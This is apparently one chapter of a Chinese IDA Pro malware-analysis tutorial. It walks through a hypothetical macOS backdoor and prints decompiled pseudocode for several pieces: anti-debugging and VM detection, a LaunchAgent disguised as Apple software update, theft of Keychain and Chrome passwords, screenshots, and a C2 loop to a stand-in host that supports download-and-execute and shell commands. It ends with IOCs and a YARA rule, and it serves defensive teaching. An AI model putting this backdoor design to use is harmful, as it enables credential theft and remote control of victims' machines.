# 第十章：实战案例演练

[返回目录](ida-pro-malware-analysis-guide.md) | [上一章](ch09-anti-analysis.md)

---

> 本章通过一个模拟的 macOS 后门样本分析，串联前九章的全部知识。我们将使用 Objective-See 公开的真实样本特征作为参考，演示从零开始的完整分析流程。

---

## 10.1 样本选择与获取

### 推荐练习样本

以下是适合入门练习的公开 macOS 恶意软件家族（按分析难度排序）：

| 家族 | 类型 | 难度 | 特点 | 来源 |
|------|------|------|------|------|
| **OSX.Dummy** | 后门 | 低 | 无混淆，简单 C2 | Objective-See |
| **OSX.Eleanor** | 后门 | 低 | PHP 后门，简单逻辑 | Objective-See |
| **OSX.CreativeUpdate** | 挖矿 | 低 | 简单 dropper + miner | MalwareBazaar |
| **OSX.Windtail** | 后门 | 中 | 简单加密，ObjC 丰富 | Objective-See |
| **OSX.XCSSET** | 多功能 | 中 | AppleScript + 二进制混合 | Objective-See |
| **OSX.Shlayer** | dropper | 中 | 多阶段投递 | MalwareBazaar |
| **OSX.Lazarus** | APT 后门 | 高 | 加密通信，反分析 | VirusTotal |

### 获取样本

```bash
# 从 Objective-See 下载
# 访问 https://objective-see.org/malware.html
# 下载感兴趣的样本（加密 ZIP，密码: infected）

# 验证哈希
shasum -a 256 downloaded_sample.zip

# 解压到分析目录
cd ~/malware_lab/samples/
unzip -P infected downloaded_sample.zip -d sample_001/
```

> **以下演练基于一个假设的 macOS 后门样本**，我们称之为 `backdoor_sample`。它的行为模拟了真实 macOS 恶意软件的典型特征。你可以用上表中任何一个真实样本替代，分析流程是通用的。

---

## 10.2 Phase 1：命令行快速 Triage

在打开 IDA 之前，先用命令行工具做快速评估。

### 基本文件信息

```bash
$ file backdoor_sample
backdoor_sample: Mach-O 64-bit executable x86_64

$ shasum -a 256 backdoor_sample
a1b2c3d4e5f6...  backdoor_sample

$ ls -la backdoor_sample
-rwxr-xr-x  1 analyst  staff  245760 Jan 15 2024 backdoor_sample

$ codesign -dvvv backdoor_sample
# 查看代码签名状态
```

### 快速字符串扫描

```bash
$ strings backdoor_sample | grep -iE '(http|password|launch|keychain|bash|curl|tmp)'
# 预期输出可能包含:
# https://cdn-update.example.com/api/v2/beacon
# /Library/LaunchAgents/com.apple.softwareupdate.plist
# /tmp/.cache_payload
# /bin/bash
# curl -s
# password
# SecKeychainFindGenericPassword
```

### 动态库依赖

```bash
$ otool -L backdoor_sample
backdoor_sample:
    /usr/lib/libSystem.B.dylib
    /usr/lib/libobjc.A.dylib
    /System/Library/Frameworks/Foundation.framework/Foundation
    /System/Library/Frameworks/Security.framework/Security
    /System/Library/Frameworks/IOKit.framework/IOKit
    /System/Library/Frameworks/AppKit.framework/AppKit
```

### Triage 总结

| 项目 | 发现 |
|------|------|
| 文件类型 | Mach-O 64-bit x86_64 可执行文件 |
| 签名 | Ad-hoc 签名（自签名） |
| 可疑字符串 | C2 URL、LaunchAgent 路径、shell 命令 |
| 框架依赖 | Foundation + Security + IOKit（暗示 Keychain 访问和硬件查询） |
| 初步判断 | 疑似后门，具备持久化和数据窃取能力 |

---

## 10.3 Phase 2：IDA 加载与初始概览

### 加载样本

1. 启动 IDA Pro
2. `File > Open` 选择 `backdoor_sample`
3. 确认加载选项：Mach-O file, MetaPC (x86-64)
4. 关闭 "Load resources"
5. 点击 OK，等待 **AU: idle**

### Strings 窗口概览

`Shift+F12` 打开 Strings 窗口，搜索关键字：

```
搜索 "http" →
    "https://cdn-update.example.com/api/v2/beacon"
    "https://cdn-update.example.com/api/v2/upload"
    "Content-Type: application/json"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"

搜索 "Launch" →
    "/Library/LaunchAgents/com.apple.softwareupdate.plist"
    "Label"
    "ProgramArguments"
    "RunAtLoad"

搜索 "keychain" →
    "SecKeychainFindGenericPassword"
    "keychain_dump"

搜索 "tmp" →
    "/tmp/.cache_update"
    "/tmp/.screenshot_%d.png"
```

### Imports 窗口审查

重点关注的导入：

```
可疑 API:
  _system                          → 命令执行
  _ptrace                          → 反调试
  _SecItemCopyMatching             → Keychain 访问
  _CGWindowListCreateImage         → 屏幕截图
  _IOServiceGetMatchingService     → 硬件信息/VM 检测
  _NSURLSession                    → 网络通信
  _objc_msgSend                    → ObjC 方法调用（大量）
  _dlopen                          → 动态库加载
  _sysctl                          → 系统信息查询
```

---

## 10.4 Phase 3：入口点分析

### 跳转到 _main

`Ctrl+E` → 选择 `_main` → `F5` 反编译

```c
int __cdecl main(int argc, const char **argv)
{
    // Block 1: 反分析检查
    if (sub_100001000())      // ← 标记为可疑：反分析检测？
        return 0;

    // Block 2: 初始化配置
    sub_100001200();          // ← 初始化函数

    // Block 3: 安装持久化
    sub_100001500();          // ← 持久化安装？

    // Block 4: 数据收集
    sub_100001800();          // ← 数据收集？

    // Block 5: 主循环
    sub_100002000();          // ← C2 通信循环？

    return 0;
}
```

### 重命名第一轮

根据上下文初步猜测，先给出临时名称：

| 原名 | 临时名称 | 依据 |
|------|---------|------|
| `sub_100001000` | `check_environment` | 在 main 开头，返回后立即 exit |
| `sub_100001200` | `init_config` | 在检查之后、功能之前 |
| `sub_100001500` | `maybe_persistence` | 中间位置 |
| `sub_100001800` | `maybe_data_collect` | 在循环之前 |
| `sub_100002000` | `maybe_main_loop` | main 的最后一个调用 |

---

## 10.5 Phase 4：逐函数深入分析

### 分析 check_environment (sub_100001000)

按 `F5` 反编译：

```c
_BOOL8 check_environment()
{
    // 反调试: ptrace
    if (ptrace(31, 0, 0, 0) == -1)
        return 1;

    // VM 检测: sysctl 获取硬件型号
    char model[256];
    size_t len = 256;
    sysctlbyname("hw.model", model, &len, 0, 0);
    if (strstr(model, "VMware") || strstr(model, "Virtual"))
        return 1;

    // 调试器检测: sysctl P_TRACED
    int mib[4] = {1, 14, 1, getpid()};
    struct kinfo_proc info;
    size_t info_size = sizeof(info);
    sysctl(mib, 4, &info, &info_size, 0, 0);
    if (info.kp_proc.p_flag & 0x800)
        return 1;

    return 0;
}
```

**分析结论**：三重反分析检测——ptrace 反调试、VM 硬件检测、sysctl 调试器检测。

**标注操作**：
1. 重命名函数为 `anti_analysis_check`
2. 重命名变量使其更清晰
3. 添加函数注释："三重反分析：ptrace + VM检测 + 调试器检测，返回1表示检测到分析环境"

### 分析 init_config (sub_100001200)

```c
void init_config()
{
    // 解密 C2 URL
    g_c2_url = xor_decrypt(encrypted_url_data, 42, 0x5A);
    // 解密上传路径
    g_upload_path = xor_decrypt(encrypted_upload_data, 38, 0x5A);
    // 解密 User-Agent
    g_user_agent = xor_decrypt(encrypted_ua_data, 78, 0x5A);
    // 设置 beacon 间隔
    g_beacon_interval = 300; // 5 分钟
}
```

**分析结论**：XOR 0x5A 解密配置字符串。

**操作**：
1. 重命名为 `decrypt_and_init_config`
2. 识别 `xor_decrypt` 函数，编写 IDAPython 脚本批量解密（参考第七章）
3. 将解密结果注释到每个调用处

### 分析持久化函数 (sub_100001500)

```c
void install_persistence()
{
    char plist_path[512];
    snprintf(plist_path, 512, "%s/Library/LaunchAgents/com.apple.softwareupdate.plist",
             getenv("HOME"));

    // 构造 plist 内容
    NSMutableDictionary *plist = [[NSMutableDictionary alloc] init];
    [plist setObject:@"com.apple.softwareupdate" forKey:@"Label"];

    NSArray *args = @[get_self_path()];
    [plist setObject:args forKey:@"ProgramArguments"];
    [plist setObject:@YES forKey:@"RunAtLoad"];
    [plist setObject:@YES forKey:@"KeepAlive"];

    [plist writeToFile:plist_path atomically:YES];

    // 将自身复制到隐藏位置
    copy_self_to("/tmp/.cache_update");
    // 设置隐藏属性
    chflags("/tmp/.cache_update", UF_HIDDEN);
}
```

**分析结论**：
- 持久化方式：用户级 LaunchAgent
- plist 名称伪装为 Apple 软件更新
- 将自身复制到 `/tmp/.cache_update` 并隐藏

### 分析数据收集函数 (sub_100001800)

```c
NSData* collect_system_data()
{
    NSMutableDictionary *data = [[NSMutableDictionary alloc] init];

    // 系统信息
    [data setObject:get_hostname() forKey:@"hostname"];
    [data setObject:get_username() forKey:@"username"];
    [data setObject:get_os_version() forKey:@"os_version"];
    [data setObject:get_mac_address() forKey:@"mac"];

    // Keychain 密码
    NSArray *passwords = dump_keychain_passwords();
    [data setObject:passwords forKey:@"keychain"];

    // 浏览器数据
    NSData *chrome_data = read_file(
        "~/Library/Application Support/Google/Chrome/Default/Login Data");
    if (chrome_data)
        [data setObject:[chrome_data base64EncodedStringWithOptions:0]
                 forKey:@"chrome_passwords"];

    // 屏幕截图
    NSData *screenshot = capture_screenshot();
    [data setObject:[screenshot base64EncodedStringWithOptions:0]
             forKey:@"screenshot"];

    return [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
}
```

**分析结论**：收集系统信息、Keychain 密码、Chrome 密码数据库、屏幕截图，打包为 JSON。

### 分析 C2 通信循环 (sub_100002000)

```c
void beacon_loop()
{
    while (1) {
        // 发送 beacon
        NSData *system_data = collect_system_data();
        NSData *response = send_https_post(g_c2_url, system_data, g_user_agent);

        if (response) {
            NSDictionary *cmd = parse_json(response);
            int cmd_type = [[cmd objectForKey:@"type"] intValue];

            switch (cmd_type) {
                case 1:  // 心跳，无操作
                    break;
                case 2:  // 下载执行
                    download_and_execute([cmd objectForKey:@"url"]);
                    break;
                case 3:  // Shell 命令
                    execute_shell_command([cmd objectForKey:@"cmd"]);
                    break;
                case 4:  // 上传文件
                    upload_file([cmd objectForKey:@"path"]);
                    break;
                case 5:  // 截屏
                    upload_screenshot();
                    break;
                case 6:  // 卸载
                    uninstall_self();
                    return;
                default:
                    break;
            }
        }

        sleep(g_beacon_interval);
    }
}
```

**分析结论**：
- C2 协议：HTTPS POST，JSON 格式
- 支持 6 种命令：心跳、下载执行、Shell 命令、上传文件、截屏、自我卸载
- Beacon 间隔 300 秒（5 分钟）

---

## 10.6 Phase 5：整合分析报告

### 行为总结

```
样本行为流程：

_main
  ├─ anti_analysis_check()
  │    ├─ ptrace 反调试
  │    ├─ VM 硬件检测
  │    └─ sysctl 调试器检测
  │
  ├─ decrypt_and_init_config()
  │    └─ XOR 0x5A 解密 C2 URL、路径、UA
  │
  ├─ install_persistence()
  │    ├─ 创建 LaunchAgent plist
  │    ├─ 自身复制到 /tmp/.cache_update
  │    └─ chflags 隐藏文件
  │
  ├─ collect_system_data()
  │    ├─ 系统信息 (hostname, user, OS, MAC)
  │    ├─ Keychain 密码
  │    ├─ Chrome 密码数据库
  │    └─ 屏幕截图
  │
  └─ beacon_loop()
       ├─ HTTPS POST beacon (每 5 分钟)
       └─ 命令分发:
            1=心跳 2=下载执行 3=Shell命令
            4=上传文件 5=截屏 6=卸载
```

### IOC 提取

```yaml
# indicators_of_compromise.yaml
network:
  c2_urls:
    - "https://cdn-update.example.com/api/v2/beacon"
    - "https://cdn-update.example.com/api/v2/upload"
  user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"

filesystem:
  persistence:
    - "~/Library/LaunchAgents/com.apple.softwareupdate.plist"
  dropped_files:
    - "/tmp/.cache_update"
    - "/tmp/.screenshot_*.png"

process:
  plist_label: "com.apple.softwareupdate"

hashes:
  sha256: "a1b2c3d4e5f6..."
  md5: "..."

mitre_attack:
  - T1547.011  # Persistence: LaunchAgent
  - T1555.001  # Credential Access: Keychain
  - T1539      # Steal Web Session Cookie
  - T1113      # Screen Capture
  - T1071.001  # C2: Web Protocols
  - T1059.004  # Execution: Unix Shell
  - T1497      # Virtualization/Sandbox Evasion
  - T1622      # Debugger Evasion
```

### YARA 规则

```yara
rule macOS_Backdoor_Sample {
    meta:
        description = "Detects the analyzed macOS backdoor sample"
        author = "Analyst"
        date = "2024-01-15"

    strings:
        $plist_label = "com.apple.softwareupdate" ascii
        $c2_path = "/api/v2/beacon" ascii
        $xor_key = { 5A }
        $persistence_path = "LaunchAgents" ascii

        $anti_debug_1 = { BF 1F 00 00 00 }    // mov edi, 0x1F (PT_DENY_ATTACH)
        $anti_debug_2 = "hw.model" ascii

        $steal_1 = "Login Data" ascii
        $steal_2 = "SecKeychainFindGenericPassword" ascii

    condition:
        uint32(0) == 0xFEEDFACF and             // Mach-O 64-bit
        $plist_label and
        ($c2_path or $xor_key) and
        any of ($anti_debug_*) and
        any of ($steal_*)
}
```

---

## 10.7 分析复盘与经验总结

### 耗时估算

| 阶段 | 预计耗时 | 说明 |
|------|---------|------|
| 命令行 Triage | 10 分钟 | 快速建立第一印象 |
| IDA 加载与概览 | 15 分钟 | Strings + Imports + 入口点 |
| 逐函数分析 | 2-4 小时 | 核心分析阶段 |
| IDAPython 辅助 | 30 分钟 | 字符串解密脚本 |
| 报告编写 | 30 分钟 | IOC + YARA + 行为总结 |
| **总计** | **3-5 小时** | 对于中等复杂度样本 |

### 遇到困难时的策略

1. **反编译结果看不懂** → 切到汇编视图对照，逐指令理解
2. **字符串都是加密的** → 先找解密函数，写 IDAPython 脚本
3. **控制流太复杂** → 从 Xref 入手，先分析叶子函数（被调用最多但不调用别人的函数）
4. **ObjC 代码太多** → 结合 `class-dump` 输出辅助理解类结构
5. **遇到反分析** → 参照第九章的方法 Patch 绕过

---

## 本章小结

- 完整分析流程：命令行 Triage → IDA 概览 → 入口点分析 → 逐函数深入 → 整合报告
- 先"广度优先"（了解全貌），再"深度优先"（逐个函数深入）
- 重命名和注释是累积分析成果的核心手段，不要吝惜
- 最终输出：行为总结 + IOC 列表 + YARA 规则 + MITRE ATT&CK 映射
- 练习是最好的学习方式——从简单样本开始，逐步挑战更复杂的

---

[<< 上一章：反分析技术与对抗](ch09-anti-analysis.md) | [附录 >>](appendix.md)
